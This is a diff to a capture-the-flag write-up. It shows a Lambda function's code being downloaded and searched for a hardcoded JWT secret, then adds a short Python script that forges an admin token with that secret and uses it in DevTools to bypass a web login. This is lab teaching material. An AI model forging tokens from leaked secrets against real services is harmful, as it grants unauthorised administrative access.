@@ -472,9 +472,9 @@ Using `get-function` along with the `--function-name` option, we can retrieve mo
 
 <br />
 
-There is an `URL` that is the location of a source.
+There is an `URL` that points to a source.
 
-With `wget` we can download this file:
+We can download this file using `wget`:
 
 <br />
 
@@ -494,7 +494,7 @@ code                                          100%[=============================
 
 <br />
 
-It is a zip file:
+The downloaded file is a `ZIP` archive:
 
 <br />
 
@@ -505,7 +505,7 @@ code: Zip archive data, at least v2.0 to extract, compression method=deflate
 
 <br />
 
-If we unzip it, we can find a Python script inside:
+After unzipping it, we find a Python script named `"lambda_function.py"`.
 
 <br />
 
@@ -521,7 +521,7 @@ Archive:  code
 
 <br />
 
-The code is not really relevant:
+The code is not really relevanti, there is only a secret:
 
 <br />
 
@@ -557,4 +557,56 @@ def lambda_handler(event, context):
 
 <br />
 
+If we remember, in the server.py, some functions were using a JWT constructed with this oneliner:
+
 <br />
+
+```python3 
+token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+```
+
+<br />
+
+In this line, the script is creating an admin token with a secret.
+
+Maybe, we can use the secret founded to create this token.
+
+To try it, I use this simply python3 script:
+
+<br />
+
+```python3 
+#!/usr/bin/env python3
+
+from termcolor import colored
+import jwt
+
+secret = "RrXCv`mrNe!K!4+5`wYq"
+
+token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+print(colored(f"\n[+] Here you have your admin token to log into the web application -> {token}\n", "red"))
+```
+
+<br />
+
+If we run it, we will obtain the admin token:
+
+<br />
+
+```bash
+[+] Here you have your admin token to log into the web application -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
+```
+
+<br />
+
+Now, we can set it using the browser `DevTools` and bypass the login:
+
+<br />
+
+
+
+<br />
+
+
+
+
